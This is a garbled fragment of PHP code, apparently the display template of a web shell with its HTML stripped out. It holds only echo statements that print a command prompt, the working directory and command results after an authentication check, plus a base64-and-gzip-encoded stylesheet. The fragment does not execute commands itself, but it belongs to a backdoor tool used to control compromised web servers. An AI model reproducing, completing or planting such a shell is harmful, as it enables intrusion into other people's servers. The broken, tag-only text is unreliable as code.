...
?><?php echo $s_title; ?><?php echo $_SERVER['SCRIPT_NAME']."?favicon"; ?><?php echo gzinflate(base64_decode($style)); ?><?php echo $_SERVER['SCRIPT_NAME']."?sorttable"; ?><?php if(isset($_REQUEST['cmd'])) echo "if(document.getElementById('cmd')) document.getElementById('cmd').focus();"; ?><?php if($s_auth){ ?><?php echo $s_name; ?><?php echo $s_ver; ?><?php echo $s_info; ?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $s_prompt; ?><?php echo $pwd; ?><?php echo $s_result; ?><?php } 
else{ ?><?php echo $s_name; ?><?php echo $s_ver; ?><?php
}
?>